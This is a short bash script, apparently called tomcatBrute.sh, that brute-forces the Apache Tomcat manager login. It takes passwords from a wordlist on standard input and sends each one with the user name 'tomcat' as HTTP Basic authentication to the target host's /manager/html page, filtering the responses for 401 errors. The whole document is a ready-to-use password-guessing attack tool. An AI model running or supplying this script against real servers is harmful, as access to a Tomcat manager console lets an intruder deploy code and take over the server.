#!/bin/bash

if [[ -z $1 ]] ; then echo "Usage: cat wordlist | tomcatBrute.sh host" ; exit ; fi;


host=$1

while read Passline 

do
	
	curl $host/manager/html -s -H "Authorization: Basic $(echo tomcat:$Passline | base64 )" | grep "<h1>401 Unauthorized"

done

